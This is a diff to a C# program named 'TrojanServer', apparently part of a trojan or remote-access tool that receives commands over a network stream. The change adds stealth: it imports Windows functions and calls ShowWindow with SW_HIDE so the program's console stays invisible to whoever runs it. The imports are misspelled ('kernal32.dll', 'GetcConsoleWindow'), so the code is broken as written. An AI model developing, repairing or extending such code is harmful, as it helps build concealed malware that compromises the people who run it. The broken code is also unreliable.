@@ -1,3 +1,4 @@
+//Migrate to .NET 3.4 (look into getting kernal32.dll to work)
 using System;
 using System.Collections.Generic;
 using System.Net.Sockets;
@@ -13,9 +14,17 @@ namespace TrojanServer
     class Program
     {
         public static NetworkStream Reciever;
-        [DllImport("user32.dll")]
-        public static extern bool FreeConsole();
+        
+        [DllImport("kernal32.dll")]
+        static extern IntPtr GetcConsoleWindow();
 
+        [DllImport("user32.dll")]
+        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+
+        const int SW_HIDE = 0;
+        const int SW_SHOW = 5;
+
+        
         public static void Recieve()
         {
             while (true)
@@ -122,10 +131,10 @@ namespace TrojanServer
         static void Main(string[] args)
 
         {
+            var handle = GetcConsoleWindow();
 
 
-
-            //FreeConsole();
+            ShowWindow(handle, SW_HIDE);
 
 
 
